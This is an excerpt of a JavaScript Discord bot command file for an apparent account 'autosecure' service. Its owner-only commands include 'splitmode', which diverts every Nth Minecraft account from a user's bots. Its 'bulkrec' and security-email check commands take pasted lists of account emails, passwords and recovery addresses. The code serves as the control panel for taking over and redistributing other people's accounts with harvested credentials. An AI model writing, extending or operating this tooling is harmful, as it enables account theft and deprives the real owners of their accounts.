...
module.exports = {
  ...
  options: [
    ...
    {
      name: "splitmode",
      description: "Configure split mode for user's bots [OWNER]",
      type: 1,
      options: [
        {
          name: "action",
        ...
        {
          name: "user_id",
          description: "The bot owner user ID (required for enable/disable)",
          type: 3,
          required: false
        },
        {
          name: "ratio",
          description: "Get every Nth account (e.g., 2 = every 2nd, 3 = every 3rd)",
          type: 4,
          required: false
        }
      ]
    ...
    {
      name: "bulkrec",
      description: "Bulk recovery with full autosecure features [OWNER]",
      type: 1,
      options: []
    }
  ],
  ...
  async autocomplete(client, interaction) {
    ...
    if (subcommand === 'access') {
      ...
      const choices = [
        ...
        { name: "---Security Tools---", value: "placeholder"},
        { name: "Check Account Security Emails", value: "check_account_security_emails" }
      ];
  ...
  async execute(client, interaction) {
    ...
    if (subcommand === "splitmode") {
      await handleSplitMode(client, interaction);
      return;
    }

    if (subcommand === "bulkrec") {
      await handleBulkRec(client, interaction);
      return;
    }
      ...
      try {
        ...
        switch (option) {
          ...
          case "key_redeemed":
            ...
            break;
          case 'check_account_security_emails':
            await handleCheckSecurityEmails(client, interaction);
            break;
          default:
...
async function handleSplitMode(client, interaction) {
  try {
    const action = interaction.options.getString('action');
    const userId = interaction.options.getString('user_id');
    const ratio = interaction.options.getInteger('ratio') || 2;
    ...
    if (action === 'list') {
      ...
      // Ensure autosecure table has split_mode columns
      try {
      ...
      let response = '**📊 Split Mode Status**\n\n';
      ...
      for (const user of allUsers) {
        ...
        // Check if any bot has split mode enabled
        const enabledBot = bots.find(b => b.split_mode_enabled === 1);
        const isEnabled = !!enabledBot;
        const status = isEnabled ? `✅ Enabled (1:${enabledBot.split_mode_ratio})` : '❌ Disabled';
        response += `<@${user.user_id}> - ${bots.length} bot(s) - ${status}\n`;
      }
    ...
    // For enable/disable, user_id is required
    if (!userId) {
      return interaction.reply({
        content: 'Please provide a valid user ID for enable/disable actions.',
        ephemeral: true
      });
    }
    ...
    if (ratio < 2) {
      return interaction.reply({
        content: 'Ratio must be at least 2 (every 2nd account).',
        ephemeral: true
      });
    }
    ...
    // Check if user has bots - look for all bots owned by this user in autosecure table
    const bots = await queryParams('SELECT id, botnumber, user_id, token FROM autosecure WHERE user_id = ?', [userId]);
    
    console.log(`[SPLIT MODE] Looking for bots owned by ${userId}, found: ${bots?.length || 0}`);
    ...
    // Update split config for all user's bots (if any exist)
    ...
    const botList = bots && bots.length > 0 ? bots.map(b => `• Bot #${b.botnumber}`).join('\n') : 'No bots registered yet';
    const statusText = enabled 
      ? `✅ Split mode **enabled** for <@${userId}>\n**Ratio:** Every ${ratio}${ratio === 2 ? 'nd' : ratio === 3 ? 'rd' : 'th'} Minecraft account\n**Bot count:** ${bots?.length || 0}\n\n**Bots:**\n${botList}`
      : `❌ Split mode **disabled** for <@${userId}>`;
    ...
    console.log(`[SPLIT MODE] ${enabled ? 'Enabled' : 'Disabled'} for user ${userId} with ratio every ${ratio}, affecting ${bots?.length || 0} bot(s)`);

  } catch (error) {
    console.error('Error in handleSplitMode:', error);
    await interaction.reply({
...
async function handleCheckSecurityEmails(client, interaction) {
  const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

  const modal = new ModalBuilder()
    .setCustomId('checksecurityemails')
    .setTitle('Check Account Security Emails');

  const accountsInput = new TextInputBuilder()
    .setCustomId('accounts')
    .setLabel('Enter accounts to check')
    .setPlaceholder('Format: email:password:securityemail:password\nOne per line')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true)
    .setMaxLength(4000);

  const firstRow = new ActionRowBuilder().addComponents(accountsInput);
  modal.addComponents(firstRow);

  await interaction.showModal(modal);
}
async function handleBulkRec(client, interaction) {
  const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

  const modal = new ModalBuilder()
    .setCustomId('admin_bulkrec_modal')
    .setTitle('Bulk Recovery Autosecure');

  const bulkInput = new TextInputBuilder()
    .setCustomId('bulkrec_data')
    .setLabel('Enter accounts (one per line)')
    .setPlaceholder('email:recovery:secemail:password\nemail:recovery:secemail:password:mcusername')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true)
    .setMaxLength(4000);
